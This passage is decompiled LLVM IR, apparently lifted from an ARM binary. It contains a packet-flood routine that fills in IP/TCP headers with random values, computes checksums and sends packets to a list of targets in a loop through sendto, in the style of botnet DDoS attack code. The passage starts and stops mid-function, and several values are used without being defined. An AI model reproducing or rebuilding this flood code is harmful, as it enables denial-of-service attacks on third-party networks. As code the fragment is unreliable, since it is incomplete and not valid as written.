  %v1_abf8 = trunc i32 %v0_abf8 to i8
  %v2_abf8 = load i32, i32* @r5, align 4
  %v3_abf8 = add i32 %v2_abf8, 9
  %v4_abf8 = inttoptr i32 %v3_abf8 to i8*
  store i8 %v1_abf8, i8* %v4_abf8, align 1
  store i32 %v6_aa50, i32* %ip.global-to-local, align 4
  %v1_ac00 = load i32, i32* @r5, align 4
  %v2_ac00 = add i32 %v1_ac00, 12
  %v3_ac00 = inttoptr i32 %v2_ac00 to i32*
  store i32 %v6_aa50, i32* %v3_ac00, align 4
  %v0_ac04 = load i32, i32* %r1.global-to-local, align 4
  %v1_ac04 = add i32 %v0_ac04, 16
  %v2_ac04 = inttoptr i32 %v1_ac04 to i32*
  %v3_ac04 = load i32, i32* %v2_ac04, align 4
  store i32 %v3_ac04, i32* %r3.global-to-local, align 4
  %v0_ac08 = load i32, i32* @sb, align 4
  %v1_ac08 = trunc i32 %v0_ac08 to i16
  %v2_ac08 = load i32, i32* @r5, align 4
  %v3_ac08 = add i32 %v2_ac08, 2
  %v4_ac08 = inttoptr i32 %v3_ac08 to i16*
  store i16 %v1_ac08, i16* %v4_ac08, align 2
  %v0_ac0c = load i32, i32* @fp, align 4
  %v1_ac0c = trunc i32 %v0_ac0c to i16
  %v2_ac0c = load i32, i32* @r5, align 4
  %v3_ac0c = add i32 %v2_ac0c, 4
  %v4_ac0c = inttoptr i32 %v3_ac0c to i16*
  store i16 %v1_ac0c, i16* %v4_ac0c, align 2
  %v0_ac10 = load i32, i32* %r3.global-to-local, align 4
  %v1_ac10 = load i32, i32* @r5, align 4
  %v2_ac10 = add i32 %v1_ac10, 16
  %v3_ac10 = inttoptr i32 %v2_ac10 to i32*
  store i32 %v0_ac10, i32* %v3_ac10, align 4
  %v0_ac14 = load i32, i32* @r6, align 4
  %v1_ac14 = trunc i32 %v0_ac14 to i16
  %v2_ac14 = load i32, i32* @r5, align 4
  %v3_ac14 = add i32 %v2_ac14, 20
  %v4_ac14 = inttoptr i32 %v3_ac14 to i16*
  store i16 %v1_ac14, i16* %v4_ac14, align 2
  %v0_ac18 = load i32, i32* @r5, align 4
  %v1_ac18 = add i32 %v0_ac18, 20
  store i32 %v1_ac18, i32* @r4, align 4
  %v1_ac1c = add i32 %v0_ac18, 32
  %v2_ac1c = inttoptr i32 %v1_ac1c to i8*
  %v3_ac1c = load i8, i8* %v2_ac1c, align 1
  %v4_ac1c = zext i8 %v3_ac1c to i32
  store i32 %v4_ac1c, i32* %r3.global-to-local, align 4
  %v1_ac20 = add i32 %v0_ac18, 33
  %v2_ac20 = inttoptr i32 %v1_ac20 to i8*
  %v3_ac20 = load i8, i8* %v2_ac20, align 1
  %v4_ac20 = zext i8 %v3_ac20 to i32
  store i32 %v1_ab28, i32* %r0.global-to-local, align 4
  %tmp76 = urem i8 %v3_ac1c, 16
  %v1_ac28 = zext i8 %tmp76 to i32
  %v1_ac2c = or i32 %v1_ac28, 80
  store i32 %v1_ac2c, i32* %r3.global-to-local, align 4
  %v1_ac30 = and i32 %v4_ac20, 223
  store i32 %v1_ac30, i32* %r2.global-to-local, align 4
  %v1_ac34 = trunc i32 %v1_ac2c to i8
  store i8 %v1_ac34, i8* %v2_ac1c, align 1
  %v0_ac38 = load i32, i32* %r2.global-to-local, align 4
  %v1_ac38 = load i32, i32* %r0.global-to-local, align 4
  %v4_ac38 = mul i32 %v1_ac38, 32
  %v5_ac38 = or i32 %v4_ac38, %v0_ac38
  store i32 %v5_ac38, i32* %r2.global-to-local, align 4
  store i32 %v5_ab30, i32* %r1.global-to-local, align 4
  %v1_ac40 = trunc i32 %v5_ac38 to i8
  %v2_ac40 = load i32, i32* @r4, align 4
  %v3_ac40 = add i32 %v2_ac40, 13
  %v4_ac40 = inttoptr i32 %v3_ac40 to i8*
  store i8 %v1_ac40, i8* %v4_ac40, align 1
  %v0_ac44 = load i32, i32* @r4, align 4
  %v1_ac44 = add i32 %v0_ac44, 13
  %v2_ac44 = inttoptr i32 %v1_ac44 to i8*
  %v3_ac44 = load i8, i8* %v2_ac44, align 1
  %v4_ac44 = zext i8 %v3_ac44 to i32
  store i32 %v1_ab2c, i32* %r2.global-to-local, align 4
  %v1_ac4c = and i32 %v4_ac44, 239
  %v5_ac50 = or i32 %v1_ac4c, %v4_ac50
  store i32 %v5_ac50, i32* %r3.global-to-local, align 4
  %v0_ac54 = load i32, i32* %r1.global-to-local, align 4
  %v2_ac54 = add i32 %v0_ac44, 4
  %v3_ac54 = inttoptr i32 %v2_ac54 to i32*
  store i32 %v0_ac54, i32* %v3_ac54, align 4
  %v0_ac58 = load i32, i32* @sl, align 4
  %v1_ac58 = trunc i32 %v0_ac58 to i16
  %v2_ac58 = load i32, i32* @r4, align 4
  %v3_ac58 = add i32 %v2_ac58, 2
  %v4_ac58 = inttoptr i32 %v3_ac58 to i16*
  store i16 %v1_ac58, i16* %v4_ac58, align 2
  %v0_ac5c = load i32, i32* %r3.global-to-local, align 4
  %v1_ac5c = trunc i32 %v0_ac5c to i8
  %v2_ac5c = load i32, i32* @r4, align 4
  %v3_ac5c = add i32 %v2_ac5c, 13
  %v4_ac5c = inttoptr i32 %v3_ac5c to i8*
  store i8 %v1_ac5c, i8* %v4_ac5c, align 1
  %v0_ac60 = load i32, i32* @r4, align 4
  %v1_ac60 = add i32 %v0_ac60, 13
  %v2_ac60 = inttoptr i32 %v1_ac60 to i8*
  %v3_ac60 = load i8, i8* %v2_ac60, align 1
  %v4_ac60 = zext i8 %v3_ac60 to i32
  store i32 %v1_ab54, i32* %r3.global-to-local, align 4
  %v1_ac68 = and i32 %v4_ac60, 247
  %v5_ac6c = or i32 %v1_ac68, %v4_ac6c
  store i32 %v5_ac6c, i32* %r2.global-to-local, align 4
  %v1_ac70 = trunc i32 %v5_ac6c to i8
  store i8 %v1_ac70, i8* %v2_ac60, align 1
  %v0_ac74 = load i32, i32* @r4, align 4
  %v1_ac74 = add i32 %v0_ac74, 13
  %v2_ac74 = inttoptr i32 %v1_ac74 to i8*
  %v3_ac74 = load i8, i8* %v2_ac74, align 1
  %v4_ac74 = zext i8 %v3_ac74 to i32
  store i32 %v1_ab58, i32* %ip.global-to-local, align 4
  %v1_ac7c = and i32 %v4_ac74, 251
  %v5_ac80 = or i32 %v1_ac7c, %v4_ac80
  store i32 %v5_ac80, i32* %r3.global-to-local, align 4
  %v1_ac84 = trunc i32 %v5_ac80 to i8
  store i8 %v1_ac84, i8* %v2_ac74, align 1
  %v0_ac88 = load i32, i32* @r4, align 4
  %v1_ac88 = add i32 %v0_ac88, 13
  %v2_ac88 = inttoptr i32 %v1_ac88 to i8*
  %v3_ac88 = load i8, i8* %v2_ac88, align 1
  %v4_ac88 = zext i8 %v3_ac88 to i32
  store i32 %v1_ab5c, i32* %r0.global-to-local, align 4
  %v1_ac90 = and i32 %v4_ac88, 253
  %v4_ac94 = or i32 %v1_ac90, %v3_ac94
  store i32 %v4_ac94, i32* %r2.global-to-local, align 4
  %v1_ac98 = trunc i32 %v4_ac94 to i8
  store i8 %v1_ac98, i8* %v2_ac88, align 1
  %v0_ac9c = load i32, i32* @r4, align 4
  %v1_ac9c = add i32 %v0_ac9c, 13
  %v2_ac9c = inttoptr i32 %v1_ac9c to i8*
  %v3_ac9c = load i8, i8* %v2_ac9c, align 1
  %v4_ac9c = zext i8 %v3_ac9c to i32
  store i32 %v1_ab60, i32* %r1.global-to-local, align 4
  %v1_aca4 = and i32 %v4_ac9c, 254
  %v2_aca8 = or i32 %v1_aca4, %v1_ab60
  store i32 %v2_aca8, i32* %r3.global-to-local, align 4
  %v1_acac = trunc i32 %v2_aca8 to i8
  store i8 %v1_acac, i8* %v2_ac9c, align 1
  %v0_acb0 = call i32 @rand_next()
  %v1_acb0 = trunc i32 %v0_acb0 to i16
  store i32 %v0_acb0, i32* %r0.global-to-local, align 4
  store i32 %v1_ab64, i32* %r2.global-to-local, align 4
  store i1 %v2_acb8, i1* %cpsr_z.global-to-local, align 1
  %v3_acc4.pre = load i32, i32* @r4, align 4
  br i1 %v2_acb8, label %.thread3, label %bb68

bb68:                                             ; preds = %.thread
  %v2_acbc = add i32 %v3_acc4.pre, 13
  %v3_acbc = inttoptr i32 %v2_acbc to i8*
  %v4_acbc = load i8, i8* %v3_acbc, align 1
  %v5_acbc = zext i8 %v4_acbc to i32
  %v2_acc0 = or i32 %v5_acbc, 8
  store i32 %v2_acc0, i32* @r3, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread, %bb68
  %v4_acc4 = add i32 %v3_acc4.pre, 14
  %v5_acc4 = inttoptr i32 %v4_acc4 to i16*
  store i16 %v1_acb0, i16* %v5_acc4, align 2
  store i32 %v6_aa14, i32* %r1.global-to-local, align 4
  %v0_accc = load i32, i32* @r5, align 4
  %v1_accc = add i32 %v0_accc, 40
  store i32 %v1_accc, i32* %r0.global-to-local, align 4
  br i1 %v2_acb8, label %bb70, label %bb69

bb69:                                             ; preds = %.thread3
  %v1_acd0 = load i32, i32* @r3, align 4
  %v2_acd0 = trunc i32 %v1_acd0 to i8
  %v3_acd0 = load i32, i32* @r4, align 4
  %v4_acd0 = add i32 %v3_acd0, 13
  %v5_acd0 = inttoptr i32 %v4_acd0 to i8*
  store i8 %v2_acd0, i8* %v5_acd0, align 1
  br label %bb70

bb70:                                             ; preds = %.thread3, %bb69
  %v2_acd4 = inttoptr i32 %v1_accc to i16*
  %v3_acd4 = call i32 @rand_str(i16* %v2_acd4, i32 %v6_aa14)
  store i32 %v3_acd4, i32* %r0.global-to-local, align 4
  %v3_acd8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_acd8, i32* %r3.global-to-local, align 4
  %v1_acdc = add i32 %v3_acd8, 1
  store i32 %v1_acdc, i32* @r4, align 4
  %v1_ace0 = load i32, i32* @r7, align 4
  %v9_ace0 = icmp eq i32 %v1_acdc, %v1_ace0
  store i1 %v9_ace0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_acdc, i32* %stack_var_-44, align 4
  %v5_ace8 = icmp slt i32 %v1_acdc, %v1_ace0
  br i1 %v5_ace8, label %dec_label_pc_ab84, label %dec_label_pc_acec

dec_label_pc_acec:                                ; preds = %bb70
  store i32 %v6_aa14, i32* %r3.global-to-local, align 4
  %v1_acf0 = add i32 %v6_aa14, 20
  store i32 %v1_acf0, i32* @sb, align 4
  br label %dec_label_pc_acf8

dec_label_pc_acf8:                                ; preds = %dec_label_pc_af3c, %dec_label_pc_acec
  %v0_ad108 = phi i32 [ %v1_ace0, %dec_label_pc_acec ], [ 0, %dec_label_pc_af3c ]
  %stack_var_-140.0 = phi i32 [ %v3_aad4, %dec_label_pc_acec ], [ %v3_af48, %dec_label_pc_af3c ]
  %storemerge = add i32 %v6_aa14, 40
  store i32 %storemerge, i32* %fp.global-to-local, align 4
  store i32 %stack_var_-140.0, i32* %r1.global-to-local, align 4
  %v1_acfc = add i32 %stack_var_-140.0, 1310720
  store i32 %v1_acfc, i32* %r2.global-to-local, align 4
  %tmp71 = udiv i32 %v1_acfc, 256
  %v3_ad04 = and i32 %tmp71, 65280
  store i32 %v3_ad04, i32* %r3.global-to-local, align 4
  %v4_ad08 = udiv i32 %v1_acfc, 16777216
  %v5_ad08 = or i32 %v3_ad04, %v4_ad08
  store i32 %v5_ad08, i32* @sl, align 4
  %v3_aea8 = icmp eq i32 %v3_aaac, 65535
  %v2_af0c = icmp eq i32 %v1_aa3c, 0
  %v2_ad48 = icmp eq i32 %v6_aa50, -1
  %v7_ad48 = icmp eq i32 %v6_aa50, -1
  br label %dec_label_pc_ad0c

dec_label_pc_ad0c:                                ; preds = %dec_label_pc_ad0c, %dec_label_pc_ae24, %dec_label_pc_acf8
  %v0_ad10 = phi i32 [ %v0_ad108, %dec_label_pc_acf8 ], [ 0, %dec_label_pc_ae24 ], [ 0, %dec_label_pc_ad0c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_ad10 = icmp eq i32 %v0_ad10, 0
  store i1 %v2_ad10, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_ad10, label %dec_label_pc_ad0c, label %dec_label_pc_ad1c

dec_label_pc_ad1c:                                ; preds = %dec_label_pc_ad0c, %dec_label_pc_ae24
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ad20

dec_label_pc_ad20:                                ; preds = %dec_label_pc_ada0, %dec_label_pc_ad1c
  %v1_ad34 = phi i32 [ %v1_ae14, %dec_label_pc_ada0 ], [ 0, %dec_label_pc_ad1c ]
  %v5_ad24 = mul i32 %v1_ad34, 24
  %v1_ad28 = load i32, i32* @r8, align 4
  %v2_ad28 = add i32 %v1_ad28, %v5_ad24
  store i32 %v2_ad28, i32* %r3.global-to-local, align 4
  store i32 %v2_a880, i32* %ip.global-to-local, align 4
  %v1_ad30 = add i32 %v2_ad28, 20
  %v2_ad30 = inttoptr i32 %v1_ad30 to i8*
  %v3_ad30 = load i8, i8* %v2_ad30, align 1
  %v4_ad30 = zext i8 %v3_ad30 to i32
  store i32 %v4_ad30, i32* %r2.global-to-local, align 4
  %v4_ad34 = mul i32 %v1_ad34, 4
  %v5_ad34 = add i32 %v4_ad34, %v2_a880
  %v6_ad34 = inttoptr i32 %v5_ad34 to i32*
  %v7_ad34 = load i32, i32* %v6_ad34, align 4
  store i32 %v7_ad34, i32* @r5, align 4
  %v7_ad38 = icmp eq i8 %v3_ad30, 31
  store i1 %v7_ad38, i1* %cpsr_z.global-to-local, align 1
  %v1_ad3c = add i32 %v7_ad34, 20
  store i32 %v1_ad3c, i32* @r6, align 4
  %tmp77 = icmp ult i8 %v3_ad30, 32
  br i1 %tmp77, label %dec_label_pc_ae38, label %dec_label_pc_ad44

dec_label_pc_ad44:                                ; preds = %dec_label_pc_ad20
  store i32 %v6_aa50, i32* %r0.global-to-local, align 4
  store i1 %v7_ad48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ad48, label %dec_label_pc_ae98, label %dec_label_pc_ad50

dec_label_pc_ad50:                                ; preds = %dec_label_pc_ae38, %dec_label_pc_ad44
  store i32 %v3_aaac, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_aea8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_aea8, label %dec_label_pc_aeb4, label %dec_label_pc_ad64

dec_label_pc_ad64:                                ; preds = %dec_label_pc_ae98.dec_label_pc_ad64_crit_edge, %dec_label_pc_ad50
  %v1_ad68 = phi i32 [ %v1_ad68.pre, %dec_label_pc_ae98.dec_label_pc_ad64_crit_edge ], [ 65535, %dec_label_pc_ad50 ]
  store i32 %v3_aab0, i32* %r2.global-to-local, align 4
  %v9_ad68 = icmp eq i32 %v3_aab0, %v1_ad68
  store i1 %v9_ad68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad68, label %dec_label_pc_aec8, label %dec_label_pc_ad70

dec_label_pc_ad70:                                ; preds = %dec_label_pc_aeb4.dec_label_pc_ad70_crit_edge, %dec_label_pc_ad64
  %v1_ad74 = phi i32 [ %v1_ad74.pre, %dec_label_pc_aeb4.dec_label_pc_ad70_crit_edge ], [ %v1_ad68, %dec_label_pc_ad64 ]
  store i32 %v3_aab4, i32* %r3.global-to-local, align 4
  %v9_ad74 = icmp eq i32 %v3_aab4, %v1_ad74
  store i1 %v9_ad74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad74, label %dec_label_pc_aedc, label %dec_label_pc_ad7c

dec_label_pc_ad7c:                                ; preds = %dec_label_pc_aec8.dec_label_pc_ad7c_crit_edge, %dec_label_pc_ad70
  %v1_ad80 = phi i32 [ %v1_ad80.pre, %dec_label_pc_aec8.dec_label_pc_ad7c_crit_edge ], [ %v1_ad74, %dec_label_pc_ad70 ]
  store i32 %v6_a950, i32* %ip.global-to-local, align 4
  %v9_ad80 = icmp eq i32 %v6_a950, %v1_ad80
  store i1 %v9_ad80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad80, label %dec_label_pc_aef0, label %dec_label_pc_ad88

dec_label_pc_ad88:                                ; preds = %dec_label_pc_aedc.dec_label_pc_ad88_crit_edge, %dec_label_pc_ad7c
  %v1_ad8c = phi i32 [ %v1_ad8c.pre, %dec_label_pc_aedc.dec_label_pc_ad88_crit_edge ], [ %v1_ad80, %dec_label_pc_ad7c ]
  store i32 %v6_a96c, i32* %r0.global-to-local, align 4
  %v9_ad8c = icmp eq i32 %v6_a96c, %v1_ad8c
  store i1 %v9_ad8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ad8c, label %dec_label_pc_af04, label %dec_label_pc_ad94

dec_label_pc_ad94:                                ; preds = %dec_label_pc_aef0, %dec_label_pc_ad88
  store i32 %v1_aa3c, i32* %r1.global-to-local, align 4
  store i1 %v2_af0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_af0c, label %dec_label_pc_ada0, label %dec_label_pc_af18

dec_label_pc_ada0:                                ; preds = %dec_label_pc_ad94, %dec_label_pc_af04, %dec_label_pc_af18
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_ada4 = load i32, i32* @r5, align 4
  %v3_ada4 = add i32 %v2_ada4, 10
  %v4_ada4 = inttoptr i32 %v3_ada4 to i16*
  store i16 0, i16* %v4_ada4, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_adac = load i32, i32* @r5, align 4
  store i32 %v0_adac, i32* @r0, align 4
  %v2_adb0 = call i32 @checksum_generic(i32 %v0_adac, i32 20)
  %v3_adb0 = trunc i32 %v2_adb0 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_adb8 = load i32, i32* @r5, align 4
  %v4_adb8 = add i32 %v3_adb8, 10
  %v5_adb8 = inttoptr i32 %v4_adb8 to i16*
  store i16 %v3_adb0, i16* %v5_adb8, align 2
  %v0_adbc = load i32, i32* @r6, align 4
  store i32 %v0_adbc, i32* @r1, align 4
  %v0_adc0 = load i32, i32* %r3.global-to-local, align 4
  %v1_adc0 = trunc i32 %v0_adc0 to i16
  %v3_adc0 = add i32 %v0_adbc, 16
  %v4_adc0 = inttoptr i32 %v3_adc0 to i16*
  store i16 %v1_adc0, i16* %v4_adc0, align 2
  %v0_adc4 = load i32, i32* @sl, align 4
  store i32 %v0_adc4, i32* %r2.global-to-local, align 4
  %v0_adc8 = load i32, i32* @sb, align 4
  store i32 %v0_adc8, i32* %r3.global-to-local, align 4
  %v0_adcc = load i32, i32* @r5, align 4
  store i32 %v0_adcc, i32* %r0.global-to-local, align 4
  %v4_add0 = call i32 @checksum_tcpudp(i32 %v0_adcc, i32 %v0_adbc, i32 %v0_adc4, i32 %v0_adc8)
  %v5_add0 = trunc i32 %v4_add0 to i16
  store i32 %v4_add0, i32* %r0.global-to-local, align 4
  %v3_add4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_add4, i32* %r3.global-to-local, align 4
  %v3_add8 = mul i32 %v3_add4, 32
  store i32 %v3_add8, i32* %lr.global-to-local, align 4
  %v3_addc = load i32, i32* @r6, align 4
  %v4_addc = add i32 %v3_addc, 16
  %v5_addc = inttoptr i32 %v4_addc to i16*
  store i16 %v5_add0, i16* %v5_addc, align 2
  %v0_ade0 = load i32, i32* %lr.global-to-local, align 4
  %v1_ade0 = load i32, i32* %r3.global-to-local, align 4
  %tmp78 = mul i32 %v1_ade0, -8
  %v5_ade0 = add i32 %v0_ade0, %tmp78
  store i32 %v5_ade0, i32* %lr.global-to-local, align 4
  %v0_ade4 = load i32, i32* @r6, align 4
  %v1_ade4 = add i32 %v0_ade4, 2
  %v2_ade4 = inttoptr i32 %v1_ade4 to i16*
  %v3_ade4 = load i16, i16* %v2_ade4, align 2
  %v4_ade4 = zext i16 %v3_ade4 to i32
  store i32 %v4_ade4, i32* @r6, align 4
  %v1_ade8 = load i32, i32* @r8, align 4
  %v2_ade8 = add i32 %v1_ade8, %v5_ade0
  store i32 %v2_ade8, i32* @lr, align 4
  %v3_adec = add i32 %v2_ade8, 2
  %v4_adec = inttoptr i32 %v3_adec to i16*
  store i16 %v3_ade4, i16* %v4_adec, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_adf8 = load i32, i32* @r5, align 4
  store i32 %v0_adf8, i32* %r1.global-to-local, align 4
  store i32 %v3_aa64, i32* %r0.global-to-local, align 4
  %v0_ae00 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_ae00, i32* %r2.global-to-local, align 4
  %v0_ae04 = load i32, i32* @lr, align 4
  %v6_ae0c = call i32 @__libc_sendto(i32 %v3_aa64, i32 %v0_adf8, i32 %v0_ae00, i32 16384, i32 %v0_ae04, i32 16)
  %v3_ae10 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ae10, i32* %r3.global-to-local, align 4
  %v1_ae14 = add i32 %v3_ae10, 1
  store i32 %v1_ae14, i32* %r0.global-to-local, align 4
  %v1_ae18 = load i32, i32* @r7, align 4
  %v9_ae18 = icmp eq i32 %v1_ae14, %v1_ae18
  store i1 %v9_ae18, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ae14, i32* %stack_var_-44, align 4
  %v5_ae20 = icmp slt i32 %v1_ae14, %v1_ae18
  br i1 %v5_ae20, label %dec_label_pc_ad20, label %dec_label_pc_ae24

dec_label_pc_ae24:                                ; preds = %dec_label_pc_ada0
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_ae28 = icmp eq i32 %v1_ae18, 0
  store i1 %v2_ae28, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_ae28, label %dec_label_pc_ad0c, label %dec_label_pc_ad1c

dec_label_pc_ae38:                                ; preds = %dec_label_pc_ad20
  %v1_ae38 = add i32 %v2_ad28, 16
  %v2_ae38 = inttoptr i32 %v1_ae38 to i32*
  %v3_ae38 = load i32, i32* %v2_ae38, align 4
  %v0_ae3c = call i32 @rand_next()
  store i32 %v0_ae3c, i32* %r0.global-to-local, align 4
  %v3_ae40 = load i32, i32* %stack_var_-44, align 4
  %v5_ae48 = mul i32 %v3_ae40, 24
  %v1_ae4c = and i32 %v3_ae38, 16711680
  store i32 %v1_ae4c, i32* %ip.global-to-local, align 4
  %v3_ae50 = udiv i32 %v3_ae38, 16777216
  %v4_ae54 = udiv i32 %v1_ae4c, 256
  %v5_ae54 = or i32 %v4_ae54, %v3_ae50
  store i32 %v5_ae54, i32* %r2.global-to-local, align 4
  %v1_ae58 = load i32, i32* @r8, align 4
  %v2_ae58 = add i32 %v1_ae58, %v5_ae48
  store i32 %v2_ae58, i32* %r1.global-to-local, align 4
  %v1_ae5c = and i32 %v3_ae38, ptrtoint (i32* @global_var_ff00.33 to i32)
  store i32 %v1_ae5c, i32* %r3.global-to-local, align 4
  %v1_ae60 = add i32 %v2_ae58, 20
  %v2_ae60 = inttoptr i32 %v1_ae60 to i8*
  %v3_ae60 = load i8, i8* %v2_ae60, align 1
  %v4_ae60 = zext i8 %v3_ae60 to i32
  store i32 %v4_ae60, i32* %ip.global-to-local, align 4
  %v4_ae64 = mul i32 %v1_ae5c, 256
  %v4_ae68 = mul i32 %v3_ae38, 16777216
  %v5_ae64 = or i32 %v4_ae64, %v4_ae68
  %v5_ae68 = or i32 %v5_ae64, %v5_ae54
  %v7_ae6c = lshr i32 %v0_ae3c, %v4_ae60
  %v8_ae6c = add i32 %v7_ae6c, %v5_ae68
  store i32 %v8_ae6c, i32* %r2.global-to-local, align 4
  %v1_ae7c = and i32 %v8_ae6c, 65280
  store i32 %v1_ae7c, i32* %r1.global-to-local, align 4
  store i32 %v6_aa50, i32* %r0.global-to-local, align 4
  %v5_ae88 = call i32 @llvm.bswap.i32(i32 %v8_ae6c)
  store i32 %v5_ae88, i32* %r3.global-to-local, align 4
  store i1 %v7_ad48, i1* %cpsr_z.global-to-local, align 1
  %v1_ae90 = load i32, i32* @r5, align 4
  %v2_ae90 = add i32 %v1_ae90, 16
  %v3_ae90 = inttoptr i32 %v2_ae90 to i32*
  store i32 %v5_ae88, i32* %v3_ae90, align 4
  br i1 %v2_ad48, label %dec_label_pc_ae98, label %dec_label_pc_ad50

dec_label_pc_ae98:                                ; preds = %dec_label_pc_ae38, %dec_label_pc_ad44
  %v0_ae98 = call i32 @rand_next()
  store i32 %v0_ae98, i32* %r0.global-to-local, align 4
  store i32 %v3_aaac, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_aea8, i1* %cpsr_z.global-to-local, align 1
  %v1_aeac = load i32, i32* @r5, align 4
  %v2_aeac = add i32 %v1_aeac, 12
  %v3_aeac = inttoptr i32 %v2_aeac to i32*
  store i32 %v0_ae98, i32* %v3_aeac, align 4
  br i1 %v3_aea8, label %dec_label_pc_aeb4, label %dec_label_pc_ae98.dec_label_pc_ad64_crit_edge

dec_label_pc_ae98.dec_label_pc_ad64_crit_edge:    ; preds = %dec_label_pc_ae98
  %v1_ad68.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad64

dec_label_pc_aeb4:                                ; preds = %dec_label_pc_ae98, %dec_label_pc_ad50
  %v0_aeb4 = call i32 @rand_next()
  %v1_aeb4 = trunc i32 %v0_aeb4 to i16
  store i32 %v0_aeb4, i32* %r0.global-to-local, align 4
  store i32 %v3_aab0, i32* %r2.global-to-local, align 4
  %v1_aebc = load i32, i32* @r4, align 4
  %v9_aebc = icmp eq i32 %v3_aab0, %v1_aebc
  store i1 %v9_aebc, i1* %cpsr_z.global-to-local, align 1
  %v3_aec0 = load i32, i32* @r5, align 4
  %v4_aec0 = add i32 %v3_aec0, 4
  %v5_aec0 = inttoptr i32 %v4_aec0 to i16*
  store i16 %v1_aeb4, i16* %v5_aec0, align 2
  br i1 %v9_aebc, label %dec_label_pc_aec8, label %dec_label_pc_aeb4.dec_label_pc_ad70_crit_edge

dec_label_pc_aeb4.dec_label_pc_ad70_crit_edge:    ; preds = %dec_label_pc_aeb4
  %v1_ad74.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad70

dec_label_pc_aec8:                                ; preds = %dec_label_pc_aeb4, %dec_label_pc_ad64
  %v0_aec8 = call i32 @rand_next()
  %v1_aec8 = trunc i32 %v0_aec8 to i16
  store i32 %v0_aec8, i32* %r0.global-to-local, align 4
  store i32 %v3_aab4, i32* %r3.global-to-local, align 4
  %v1_aed0 = load i32, i32* @r4, align 4
  %v9_aed0 = icmp eq i32 %v3_aab4, %v1_aed0
  store i1 %v9_aed0, i1* %cpsr_z.global-to-local, align 1
  %v3_aed4 = load i32, i32* @r5, align 4
  %v4_aed4 = add i32 %v3_aed4, 20
  %v5_aed4 = inttoptr i32 %v4_aed4 to i16*
  store i16 %v1_aec8, i16* %v5_aed4, align 2
  br i1 %v9_aed0, label %dec_label_pc_aedc, label %dec_label_pc_aec8.dec_label_pc_ad7c_crit_edge

dec_label_pc_aec8.dec_label_pc_ad7c_crit_edge:    ; preds = %dec_label_pc_aec8
  %v1_ad80.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad7c

dec_label_pc_aedc:                                ; preds = %dec_label_pc_aec8, %dec_label_pc_ad70
  %v0_aedc = call i32 @rand_next()
  %v1_aedc = trunc i32 %v0_aedc to i16
  store i32 %v0_aedc, i32* %r0.global-to-local, align 4
  store i32 %v6_a950, i32* %ip.global-to-local, align 4
  %v1_aee4 = load i32, i32* @r4, align 4
  %v9_aee4 = icmp eq i32 %v6_a950, %v1_aee4
  store i1 %v9_aee4, i1* %cpsr_z.global-to-local, align 1
  %v3_aee8 = load i32, i32* @r6, align 4
  %v4_aee8 = add i32 %v3_aee8, 2
  %v5_aee8 = inttoptr i32 %v4_aee8 to i16*
  store i16 %v1_aedc, i16* %v5_aee8, align 2
  br i1 %v9_aee4, label %dec_label_pc_aef0, label %dec_label_pc_aedc.dec_label_pc_ad88_crit_edge

dec_label_pc_aedc.dec_label_pc_ad88_crit_edge:    ; preds = %dec_label_pc_aedc
  %v1_ad8c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad88

dec_label_pc_aef0:                                ; preds = %dec_label_pc_aedc, %dec_label_pc_ad7c
  %v0_aef0 = call i32 @rand_next()
  %v1_aef4 = load i32, i32* @r6, align 4
  %v2_aef4 = add i32 %v1_aef4, 4
  %v3_aef4 = inttoptr i32 %v2_aef4 to i32*
  store i32 %v0_aef0, i32* %v3_aef4, align 4
  store i32 %v6_a96c, i32* %r0.global-to-local, align 4
  %v1_aefc = load i32, i32* @r4, align 4
  %v9_aefc = icmp eq i32 %v6_a96c, %v1_aefc
  store i1 %v9_aefc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aefc, label %dec_label_pc_af04, label %dec_label_pc_ad94

dec_label_pc_af04:                                ; preds = %dec_label_pc_aef0, %dec_label_pc_ad88
  %v0_af04 = call i32 @rand_next()
  store i32 %v0_af04, i32* %r0.global-to-local, align 4
  store i32 %v1_aa3c, i32* %r1.global-to-local, align 4
  store i1 %v2_af0c, i1* %cpsr_z.global-to-local, align 1
  %v1_af10 = load i32, i32* @r6, align 4
  %v2_af10 = add i32 %v1_af10, 8
  %v3_af10 = inttoptr i32 %v2_af10 to i32*
  store i32 %v0_af04, i32* %v3_af10, align 4
  br i1 %v2_af0c, label %dec_label_pc_ada0, label %dec_label_pc_af18

dec_label_pc_af18:                                ; preds = %dec_label_pc_ad94, %dec_label_pc_af04
  %v0_af18 = load i32, i32* @r5, align 4
  %v1_af18 = add i32 %v0_af18, 40
  store i32 %v1_af18, i32* %r0.global-to-local, align 4
  store i32 %v6_aa14, i32* %r1.global-to-local, align 4
  %v2_af20 = inttoptr i32 %v1_af18 to i16*
